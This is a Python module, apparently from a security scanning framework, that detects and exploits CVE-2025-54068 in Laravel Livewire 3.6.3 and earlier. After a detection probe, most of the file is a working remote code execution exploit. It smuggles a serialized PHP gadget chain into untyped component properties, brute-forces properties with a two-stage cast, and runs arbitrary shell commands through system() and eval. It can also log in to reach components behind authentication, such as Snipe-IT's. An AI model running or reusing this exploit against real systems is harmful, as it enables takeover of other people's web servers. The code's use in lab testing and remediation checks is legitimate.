#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2025-54068')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
import re
import html
import json
import time
import requests
from typing import Optional, Dict, List, Tuple, Union
from modules.core import http_config

requests.packages.urllib3.disable_warnings()

# Pages that commonly render an UNAUTHENTICATED Livewire component (and thus a hydratable snapshot).
PUBLIC_PAGES = ["", "/counter", "/demo", "/livewire", "/home"]

# Pages that render a Livewire component only once AUTHENTICATED (Snipe-IT and similar admin apps).
# Probed only when a session/credentials are supplied. /account/api mounts PersonalAccessTokens
# (untyped public $name) — the component the Snipe-IT exploit targets.
AUTH_PAGES = ["/account/api", "/settings/general", "/settings/slack", "/settings/labels",
              "/account/profile", "/dashboard", ""]

CSRF_META_RE = re.compile(r'name="csrf-token"\s+content="([^"]+)"', re.I)
CSRF_INPUT_RE = re.compile(r'<input[^>]+name="_token"[^>]+value="([^"]+)"', re.I)
SNAPSHOT_RE = re.compile(r'wire:snapshot="([^"]+)"', re.I)

# A unique sentinel used by the legacy scalar hydration probe.
HYDRATION_SENTINEL = "918273645091"
# A safe synthetic-tuple proof for the actual CVE gate. The gadget calls PHP printf(), not an OS
# command; patched Livewire returns a normal snapshot, while vulnerable Livewire prints this nonce.
SAFE_SYNTHETIC_SENTINEL = "LVSAFE54068_PROBE"


def _looks_vulnerable(resp: requests.Response) -> bool:
    """
    True only when the /livewire/update response is a genuine Livewire HYDRATION response that
    REFLECTS our injected sentinel — i.e. the server accepted the request, hydrated the component
    from attacker-supplied snapshot/updates, and echoed our injected value back in a fresh snapshot.
    A bare 500 (no reachable component), a 419 (CSRF rejected), or a non-Livewire body are NOT
    treated as vulnerable, so this does not false-positive on patched/auth-gated/non-Livewire targets.
    """
    if resp.status_code != 200:
        return False
    body = resp.text or ""
    try:
        data = resp.json()
    except Exception:
        return False
    comps = data.get("components") if isinstance(data, dict) else None
    if not comps or not isinstance(comps, list) or not comps:
        return False
    first = comps[0]
    if not (isinstance(first, dict) and ("snapshot" in first or "effects" in first)):
        return False
    return HYDRATION_SENTINEL in body


def _fetch_token_and_snapshot(session: requests.Session, base_url: str, pages: List[str]):
    """GET each candidate page until one yields a CSRF token AND a Livewire component snapshot."""
    for page in pages:
        try:
            r = session.get(base_url + page, timeout=8, verify=False, allow_redirects=True)
        except Exception:
            continue
        body = r.text or ""
        csrf = CSRF_META_RE.search(body)
        snap = SNAPSHOT_RE.search(body)
        if csrf and snap:
            return csrf.group(1), html.unescape(snap.group(1)), r.url
    return None, None, None


def _probe_hydration(session: requests.Session, base_url: str, token: str, snapshot: str,
                     page_url: str) -> Tuple[bool, Optional[int], Optional[str]]:
    """
    POST /livewire/update injecting the sentinel into each candidate property until one is reflected.
    Returns (vulnerable, last_http_status, reflected_property).
    """
    update_url = base_url + "/livewire/update"
    headers = {
        "Content-Type": "application/json",
        "X-Livewire": "true",
        "X-CSRF-TOKEN": token,
        "Origin": base_url,
        "Referer": page_url or base_url,
    }
    # Property names: the component's own (from the snapshot data) plus common untyped-prop names.
    prop_names = []
    try:
        prop_names = list((json.loads(snapshot).get("data") or {}).keys())
    except Exception:
        pass
    for common in ("count", "name", "message", "value", "search", "query"):
        if common not in prop_names:
            prop_names.append(common)

    last_status = None
    for prop in prop_names:
        payload = {
            "_token": token,
            "components": [{"snapshot": snapshot, "updates": {prop: HYDRATION_SENTINEL}, "calls": []}],
        }
        try:
            r = session.post(update_url, json=payload, headers=headers, timeout=8, verify=False)
        except Exception:
            continue
        last_status = r.status_code
        if r.status_code == 404:
            return False, 404, None
        if _looks_vulnerable(r):
            return True, r.status_code, prop
    return False, last_status, None


def _probe_safe_synthetic_tuple(session: requests.Session, base_url: str, page_url: str):
    """Behaviorally prove the vulnerable synthetic-tuple hydration path without OS command exec."""
    outcome = _exploit_page(session, base_url, page_url, "printf", SAFE_SYNTHETIC_SENTINEL)
    if outcome is None:
        return False, "no usable Livewire snapshot/token", {}
    ok, evidence, detail, artifacts = outcome
    if ok and SAFE_SYNTHETIC_SENTINEL in (evidence or ""):
        return True, detail, artifacts
    return False, detail, artifacts


def _login_confirmed(session: requests.Session, base_url: str,
                     login_path: str = "/login") -> bool:
    """Host-agnostic positive check that the session is actually authenticated.

    We do NOT trust the login POST's response URL: Snipe-IT's APP_URL redirect
    (e.g. 127.0.0.1 -> localhost) can drop the session cookie on the cross-host
    hop and make a *successful* login land back on /login, while the same-host
    cookie jar is in fact authenticated. So instead we GET an authenticated page
    on the ORIGINAL target host and confirm it loads (200) WITHOUT bouncing to
    /login. Any such page == the session is authenticated.
    """
    for page in AUTH_PAGES:
        url = base_url + page
        try:
            r = session.get(url, timeout=10, verify=False, allow_redirects=True)
        except Exception:
            continue
        final = (getattr(r, "url", "") or "").rstrip("/")
        # Authenticated iff a 200 that did not get redirected to the login page.
        if r.status_code == 200 and not final.endswith(login_path.rstrip("/")):
            # An unauthenticated Snipe-IT can still 200 on "/" -> require that the
            # body is not just the login form (login form carries name="password").
            body = r.text or ""
            if not (page in ("", "/") and CSRF_INPUT_RE.search(body)
                    and 'name="password"' in body):
                return True
    return False


def _try_login(session: requests.Session, base_url: str, username: str, password: str,
               login_path: str = "/login", *, retries: int = 3, retry_delay: float = 3.0) -> bool:
    """Log in and CONFIRM success via a host-agnostic signal; True only when confirmed.

    Scrapes the hidden _token from the login form, POSTs the credentials through the
    session cookie jar, then verifies authentication with _login_confirmed(). Because
    DB-backed apps (Snipe-IT) often answer HTTP 200 on /login while still seeding the
    admin user (a migrate/seed race), a confirmed-login failure is retried a few times
    with a short delay — so a not-yet-ready target is absorbed rather than misreported
    as "no vulnerable component". Returns False (login NOT confirmed) only after the
    retries are exhausted; short-circuits the instant login is confirmed.
    """
    for attempt in range(max(1, retries)):
        try:
            r = session.get(base_url + login_path, timeout=10, verify=False)
            m = CSRF_INPUT_RE.search(r.text or "")
            if m:
                token = m.group(1)
                session.post(
                    base_url + login_path,
                    data={"_token": token, "username": username, "password": password,
                          "email": username},  # some apps use email; harmless extra field
                    timeout=10, verify=False, allow_redirects=True,
                )
                if _login_confirmed(session, base_url, login_path):
                    return True
        except Exception:
            pass
        # Not confirmed yet — likely wrong creds OR the lab is still seeding. Retry
        # the few remaining times to absorb a migrate/seed race on a fresh boot.
        if attempt < retries - 1:
            time.sleep(retry_delay)
    return False


def scan(base_url: str, *, session=None, username=None, password=None,
         login_path: str = "/login", **kwargs) -> Optional[Dict[str, Union[str, int, bool]]]:
    """
    CVE-2025-54068 — Livewire component hydration detection (SAFE probe). Works two ways:

    UNAUTHENTICATED (default): GET a public page, scrape the meta csrf-token + wire:snapshot, then
    POST a safe synthetic-tuple gadget that calls PHP printf(<nonce>). A raw nonce response proves
    the vulnerable hydration path without executing an OS command.

    AUTHENTICATED (when `session` is passed, or `username`/`password` given): after the unauthenticated
    probe, log in (or use the supplied session) and repeat the probe against authenticated component
    pages (e.g. Snipe-IT's /account/api -> PersonalAccessTokens). This gates apps like Snipe-IT whose
    vulnerable Livewire components are auth-gated, mirroring how the real exploit reaches them.

    What it detects: a reachable Livewire hydration surface with unsafe-tuple behavior indicators.
    Some source-level mitigations can block the full gadget chain while this safe probe still reports
    the component reachable, so remediation for the Snipe-IT lab is exploit-gated: after mitigation,
    check.py --exploit should attempt the chain and observe no command output.
    """
    operator_authed = session is not None
    sess = session or http_config.get_auth_session()

    if not base_url:
        return None

    base_url = base_url.rstrip("/")
    result = {
        "cve": "CVE-2025-54068",
        "endpoint": "/livewire/update",
        "url": base_url + "/livewire/update",
        "http_status": None,
        "probe_performed": False,
        "unsafe_hydration_detected": False,
        "authenticated": False,
        "status": "unknown",
    }

    # ---- Unauthenticated probe (always attempted) ----
    sess.headers.setdefault("User-Agent", http_config.BROWSER_USER_AGENT)
    sess.headers.setdefault("X-lvcscan", "CVE-2025-54068")
    try:
        token, snapshot, page_url = _fetch_token_and_snapshot(sess, base_url, PUBLIC_PAGES)
        if token and snapshot:
            result["probe_performed"] = True
            vuln, detail, artifacts = _probe_safe_synthetic_tuple(sess, base_url, page_url)
            result["safe_synthetic_probe"] = True
            if vuln:
                result.update(
                    status="confirmed_vulnerable",
                    verdict="confirmed_vulnerable",
                    proof_type="safe_active",
                    unsafe_hydration_detected=True,
                    source_page=page_url,
                    evidence=detail,
                    artifacts=artifacts,
                )
                print("[+] /livewire/update (unauthenticated) -> safe synthetic tuple executed")
                return result

        # ---- Authenticated probe (only if a session or a complete credential pair was supplied) ----
        partial_creds = (username is None) != (password is None)
        want_auth = operator_authed or (username is not None and password is not None)
        login_failed = False
        if want_auth:
            # When operator supplied a session (operator_authed), reuse it directly —
            # skip self-login to avoid clobbering the caller's authenticated jar.
            # When credentials were supplied without a session, perform the login.
            if not operator_authed:
                if not _try_login(sess, base_url, username, password, login_path):
                    # Login could not be CONFIRMED (wrong creds, or the target is
                    # still seeding the admin user). Record it so the caller doesn't
                    # mistake an auth failure for "no vulnerable component".
                    login_failed = True
            atoken, asnap, apage = _fetch_token_and_snapshot(sess, base_url, AUTH_PAGES)
            if atoken and asnap:
                result["probe_performed"] = True
                vuln, detail, artifacts = _probe_safe_synthetic_tuple(sess, base_url, apage)
                result["safe_synthetic_probe"] = True
                if vuln:
                    result.update(
                        status="confirmed_vulnerable",
                        verdict="confirmed_vulnerable",
                        proof_type="safe_active",
                        unsafe_hydration_detected=True,
                        authenticated=True,
                        source_page=apage,
                        evidence=detail,
                        artifacts=artifacts,
                    )
                    print("[+] /livewire/update (authenticated) -> safe synthetic tuple executed")
                    return result

        # ---- No reachable vulnerable surface ----
        if partial_creds and not result["probe_performed"]:
            result["status"] = "auth_credentials_incomplete"
            result["login_confirmed"] = False
        elif want_auth and login_failed and not result["probe_performed"]:
            # Distinguish "couldn't authenticate / target not ready" from "logged in
            # but no vulnerable component" — the former is a transient/credential issue.
            result["status"] = "login_failed"
            result["login_confirmed"] = False
        elif not result["probe_performed"]:
            result["status"] = "no_reachable_component"
        else:
            result["status"] = "patched" if result["http_status"] == 419 else "protected"
        return result

    except Exception as e:
        print(f"[!] Livewire scan error: {e}")
        return {"cve": "CVE-2025-54068", "status": "error", "error": str(e), "probe_performed": False}


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2025-54068 exploitation half — Livewire <=3.6.3 unsafe property hydration -> RCE.

Split from the original modules/cve_2025_54068.py (detection half:
modules/cves/cve_2025_54068.py). Shared constants/helpers (PUBLIC_PAGES, AUTH_PAGES,
_try_login and CSRF_META_RE live in the detection half and are
imported here. Exploitation may import from modules root (shared infra) and modules.detection.
"""

import re
import html
import json
import secrets
import shlex
import requests
from typing import Optional
from urllib.parse import urlparse

from modules.core import http_config

requests.packages.urllib3.disable_warnings()

# ---------------------------------------------------------------------------
# exploit() — CVE-2025-54068 Livewire <=3.6.3 unsafe property hydration -> RCE
# ---------------------------------------------------------------------------
# Pure-HTTP port of Synacktiv's Livepyre (no-APP_KEY path). The bug: Livewire
# 3.0.0-beta.1 .. 3.6.3 recursively hydrates attacker-controlled `updates`
# values in HandleComponents::hydrateForUpdate(); smuggling a synthesizer into
# an UNTYPED public property drives a POP chain to RCE WITHOUT the APP_KEY.
#
# Two-stage exploit (mirrors exploit_wappkey.py):
#   stage1 (only when no object-typed prop exists): POST updates:{prop: []} to
#           re-cast the prop to an array, yielding a snapshot where it is an
#           object type the synthesizer will hydrate.
#   stage2: POST the gadget chain
#           BroadcastEvent -> PendingBroadcast -> Validator::$extensions ->
#           system($cmd). On success the gadget calls system() then the request
#           dies, so the response body is the RAW command output and contains
#           no fresh "snapshot" -> that is the success oracle.
#
# Auth: the bug is unauthenticated by nature; whether YOU need creds depends on
# whether a vulnerable Livewire component is reachable without login. The
# the current Snipe-IT lab (41004) gates its components behind /login
# (PersonalAccessTokens on /account/api, untyped public $name). When
# username/password are given we log in first and probe AUTH_PAGES.

CSRF_DATA_RE = re.compile(r'data-csrf="([^"]+)"')
CSRF_CONFIG_RE = re.compile(r'livewireScriptConfig\s*=\s*(\{.*?\});', re.S)
UPDATE_URI_DATA_RE = re.compile(r'data-update-uri="([^"]+)"')

# Synacktiv Livepyre gadget chain (no-APP_KEY). The injected closure runs
# system([PARAM]) via Validator extensions; the placeholders are substituted
# with the real command length/value before sending.
_GADGET_CHAINED = (
    'O:38:"Illuminate\\Broadcasting\\BroadcastEvent":4:{s:5:"dummy";'
    'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{'
    's:9:"\x00*\x00events";O:31:"Illuminate\\Validation\\Validator":1:{'
    's:10:"extensions";a:1:{s:0:"";s:[FUNCTION_LEN]:"[FUNCTION]";}}'
    's:8:"\x00*\x00event";s:[PARAM_LEN]:"[PARAM]";}'
    's:10:"connection";N;s:5:"queue";N;s:5:"event";'
    'O:37:"Illuminate\\Notifications\\Notification":0:{}}'
)


def _gadget_updates(function: str, param: str) -> list:
    """Build the Livepyre payload.json `updates[TARGET]` value with the user's
    function/param substituted into the smuggled PHP serialized POP chain."""
    chained = (_GADGET_CHAINED
               .replace("[FUNCTION_LEN]", str(len(function)))
               .replace("[FUNCTION]", function)
               .replace("[PARAM_LEN]", str(len(param)))
               .replace("[PARAM]", param))
    return [
        1,
        [
            {
                "a": [
                    {
                        "__toString": "phpversion",
                        "close": [
                            [
                                [
                                    {"chained": [chained]},
                                    {"s": "form",
                                     "class": "Illuminate\\Broadcasting\\BroadcastEvent"},
                                ],
                                "dispatchNextJobInChain",
                            ],
                            {"s": "clctn",
                             "class": "Laravel\\SerializableClosure\\Serializers\\Signed"},
                        ],
                    },
                    {"s": "clctn", "class": "GuzzleHttp\\Psr7\\FnStream"},
                ],
                "b": [
                    {
                        "__toString": [
                            [
                                [None, {"s": "mdl",
                                        "class": "Laravel\\Prompts\\Terminal"}],
                                "exit",
                            ],
                            {"s": "clctn",
                             "class": "Laravel\\SerializableClosure\\Serializers\\Signed"},
                        ]
                    },
                    {"s": "clctn", "class": "GuzzleHttp\\Psr7\\FnStream"},
                ],
            },
            {"class": "League\\Flysystem\\UrlGeneration\\ShardedPrefixPublicUrlGenerator",
             "s": "clctn"},
        ],
    ]


def _extract_csrf(body: str) -> Optional[str]:
    """CSRF token from data-csrf, livewireScriptConfig JSON, or the meta tag."""
    m = CSRF_DATA_RE.search(body)
    if m:
        return m.group(1)
    m = CSRF_CONFIG_RE.search(body)
    if m:
        try:
            return json.loads(m.group(1)).get("csrf")
        except Exception:
            pass
    m = CSRF_META_RE.search(body)
    if m:
        return m.group(1)
    return None


def _extract_update_uri(body: str) -> str:
    """Livewire update endpoint from livewireScriptConfig.uri / data-update-uri."""
    m = CSRF_CONFIG_RE.search(body)
    if m:
        try:
            uri = json.loads(m.group(1)).get("uri")
            if uri:
                return uri
        except Exception:
            pass
    m = UPDATE_URI_DATA_RE.search(body)
    if m:
        return m.group(1)
    return "/livewire/update"


def _pick_object_param(data: dict) -> Optional[str]:
    """Find a prop already typed as a non-scalar synthesizer object (no stage1
    cast needed). Mirrors Exploit.check_array_param()."""
    strict = {"str", "std", "int", "float", "mdl"}
    for prop, val in data.items():
        if isinstance(val, list):
            for entry in val:
                if isinstance(entry, dict) and entry.get("s") and entry["s"] not in strict:
                    return prop
    return None


def _one_shot_shell_command(command: str) -> str:
    """Wrap an operator command so duplicate gadget destructor paths stay quiet.

    The Livewire/Laravel POP chain can invoke system() more than once during a
    single request. A unique, per-attempt mkdir guard preserves the first real
    command execution and makes any later invocation in the same request exit
    without printing or repeating side effects.
    """
    guard = "/tmp/lvc54068-" + secrets.token_hex(8)
    return (
        f"__lvc_once={shlex.quote(guard)}; "
        'mkdir "$__lvc_once" 2>/dev/null || exit 0; '
        f"__lvc_cmd={shlex.quote(command)}; "
        'eval "$__lvc_cmd"'
    )


def _send_gadget(session, update_url, headers, token, snapshot, prop,
                 function, param):
    """stage2: send the RCE gadget. Returns (success, body, status)."""
    payload = {
        "_token": token,
        "components": [{
            "snapshot": snapshot,
            "updates": {prop: _gadget_updates(function, param)},
            "calls": [],
        }],
    }
    r = session.post(update_url, json=payload, headers=headers, timeout=12, verify=False)
    body = r.text or ""
    # Success oracle (Livepyre): 200 + the response is raw command output, i.e.
    # NOT a fresh re-hydrated snapshot. A patched/failed run echoes "snapshot".
    success = r.status_code == 200 and '"snapshot"' not in body
    return success, body, r.status_code


def _cast_to_array(session, update_url, headers, token, snapshot, prop):
    """stage1: cast `prop` to an array so the synthesizer hydrates our object.
    Returns the freshly re-hydrated snapshot string, or None."""
    payload = {
        "_token": token,
        "components": [{"snapshot": snapshot, "updates": {prop: []}, "calls": []}],
    }
    try:
        r = session.post(update_url, json=payload, headers=headers, timeout=12, verify=False)
        return r.json()["components"][0]["snapshot"]
    except Exception:
        return None


def _exploit_page(session, base_url, page_url, function, param):
    """Run the full two-stage no-APP_KEY exploit against one rendered page.
    Returns (success, evidence, detail, artifacts) or None if the page has no
    usable Livewire snapshot/token."""
    try:
        r = session.get(page_url, timeout=10, verify=False, allow_redirects=True)
    except Exception:
        return None
    body = r.text or ""
    if "wire:snapshot" not in body:
        return None
    token = _extract_csrf(body)
    if not token:
        return None
    update_uri = _extract_update_uri(body)
    if update_uri.startswith(("http://", "https://")):
        # Livewire renders the update URI from the request Host; a forced Host override
        # (-H 'Host: …') is reflected into this ABSOLUTE URI, so re-base its host/scheme
        # back onto the connection target (base_url). No-op when the host already matches.
        _uu, _bu = urlparse(update_uri), urlparse(base_url)
        if _uu.netloc and _bu.netloc and _uu.netloc != _bu.netloc:
            update_url = _uu._replace(scheme=_bu.scheme or _uu.scheme, netloc=_bu.netloc).geturl()
        else:
            update_url = update_uri
    else:
        update_url = base_url + ("/" + update_uri.lstrip("/"))
    headers = {
        "Content-Type": "application/json",
        "X-Livewire": "true",
        "X-CSRF-TOKEN": token,
        "Origin": base_url,
        "Referer": r.url or page_url,
    }
    snapshots = re.findall(r'wire:snapshot="([^"]*)"', body)
    for raw in snapshots:
        try:
            snap = json.loads(html.unescape(raw))
        except Exception:
            continue
        data = snap.get("data") or {}
        if not data:
            continue
        snap_str = json.dumps(snap)
        # Fast path: an already object-typed prop needs no stage1 cast.
        obj_prop = _pick_object_param(data)
        if obj_prop is not None:
            ok, out, status = _send_gadget(session, update_url, headers, token,
                                           snap_str, obj_prop, function, param)
            if ok:
                return (True, out.strip(),
                        f"RCE via untyped Livewire prop '{obj_prop}' "
                        f"(object-typed, no cast) on {r.url}",
                        {"property": obj_prop, "update_url": update_url,
                         "command": param, "function": function,
                         "stage1_cast": False})
        # Bruteforce: cast each prop to array (stage1) then fire the gadget.
        for prop in data.keys():
            new_snap = _cast_to_array(session, update_url, headers, token, snap_str, prop)
            if not new_snap:
                continue
            ok, out, status = _send_gadget(session, update_url, headers, token,
                                           new_snap, prop, function, param)
            if ok:
                return (True, out.strip(),
                        f"RCE via untyped Livewire prop '{prop}' "
                        f"(stage1 array-cast) on {r.url}",
                        {"property": prop, "update_url": update_url,
                         "command": param, "function": function,
                         "stage1_cast": True})
    return (False, "", f"reachable Livewire snapshot on {r.url} but no prop "
            f"yielded command output (patched >=3.6.4 or non-exploitable component)", {})


def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Attempt CVE-2025-54068 Livewire hydration RCE over pure HTTP.

    Ports Synacktiv Livepyre's no-APP_KEY path: find a rendered Livewire
    component, smuggle a PHP POP chain into an untyped public property via
    /livewire/update, and run system(command). success=True ONLY if the
    response carries the raw command output (no fresh snapshot echoed).

    Unauthenticated by nature; pass username/password to reach auth-gated
    components (Snipe-IT). command defaults to "echo CVE-2025-54068 PoC && id && hostname". No APP_KEY required.
    """
    operator_authed = session is not None
    result = {
        "cve": "CVE-2025-54068",
        "attempted": True,
        "success": False,
        "vuln_class": "deserialize_rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }
    if not target_url:
        result.update(attempted=False, reason="no target_url provided")
        return result

    cmd = command or "echo CVE-2025-54068 PoC && id && hostname"
    function = (options or {}).get("function", "system") if options else "system"
    shell_guarded = function in {"system", "shell_exec", "passthru", "exec"}
    exploit_cmd = _one_shot_shell_command(cmd) if shell_guarded else cmd
    base_url = target_url.rstrip("/")

    def _clean_artifacts(artifacts):
        cleaned = dict(artifacts or {})
        if shell_guarded:
            cleaned["command"] = cmd
            cleaned["one_shot_guard"] = True
        return cleaned

    try:
        # ---- Unauthenticated attempt (the bug needs no creds) ----
        sess = session or http_config.get_auth_session()
        sess.headers.setdefault("User-Agent", http_config.BROWSER_USER_AGENT)
        sess.headers.setdefault("X-lvcscan", "CVE-2025-54068")
        # Probe the explicit target first, then well-known public component pages.
        pages = [base_url] + [base_url + p for p in PUBLIC_PAGES if p and base_url + p != base_url]
        last_fail = None
        for page in pages:
            outcome = _exploit_page(sess, base_url, page, function, exploit_cmd)
            if outcome is None:
                continue
            ok, ev, detail, arts = outcome
            if ok:
                result.update(success=True, evidence=ev, detail=detail,
                              artifacts=_clean_artifacts(arts))
                return result
            last_fail = (detail, _clean_artifacts(arts))

        # ---- Authenticated attempt (only if a complete credential pair is supplied) ----
        partial_creds = (username is None) != (password is None)
        if not operator_authed and partial_creds:
            result.update(
                requires=["both username and password for auth-gated Livewire components"],
                detail="partial credentials supplied; refusing to fill the missing value from lab defaults",
                reason="provide both -U and -P or use an authenticated session/header",
            )
            return result

        if not operator_authed and username is not None and password is not None:
            authsess = http_config.get_auth_session()
            authsess.headers.setdefault("User-Agent", http_config.BROWSER_USER_AGENT)
            authsess.headers.setdefault("X-lvcscan", "CVE-2025-54068")
            login_ok = _try_login(
                authsess,
                base_url,
                username,
                password,
            )
            if not login_ok:
                # Login could not be CONFIRMED (wrong creds, or the target is still
                # seeding the admin user on a fresh boot). Report this distinctly so
                # an auth failure is not misread as "no vulnerable component".
                result.update(
                    requires=["valid credentials for the auth-gated Livewire component"],
                    detail="could not confirm authenticated session at target",
                    reason="login not confirmed with the supplied credentials — wrong "
                           "username/password, or the target is not ready yet (DB-backed "
                           "apps like Snipe-IT 200 on /login while still seeding the admin "
                           "user). Verify creds and/or retry once the app has finished "
                           "migrate/seed.")
                return result
            auth_pages = [base_url] + [base_url + p for p in AUTH_PAGES if p]
            # de-dup while preserving order
            seen = set()
            auth_pages = [p for p in auth_pages if not (p in seen or seen.add(p))]
            for page in auth_pages:
                outcome = _exploit_page(authsess, base_url, page, function, exploit_cmd)
                if outcome is None:
                    continue
                ok, ev, detail, arts = outcome
                if ok:
                    arts = _clean_artifacts(arts)
                    arts["authenticated"] = True
                    result.update(success=True, evidence=ev,
                                  detail=detail + " [authenticated]", artifacts=arts)
                    return result
                last_fail = (detail, _clean_artifacts(arts))
        elif last_fail is None:
            # No reachable component unauthenticated and no creds to try authed.
            result.update(
                requires=["reachable_livewire_component (or credentials for "
                          "auth-gated components)"],
                detail="no rendered Livewire component reachable at target",
                reason="no public wire:snapshot found; if components are "
                       "auth-gated (e.g. Snipe-IT) pass -U/-P credentials")
            return result

        # Reachable but exploitation did not produce output.
        if last_fail:
            detail, arts = last_fail
            result.update(detail=detail, artifacts=arts,
                          reason="Livewire component reachable but gadget chain "
                                 "produced no command output (likely patched "
                                 ">=3.6.4 or required gadget classes absent)")
        else:
            result.update(
                detail="no rendered Livewire component reachable at target",
                reason="no wire:snapshot found on probed pages")
        return result

    except Exception as e:
        result.update(success=False, reason=f"exploit error: {e}")
        return result
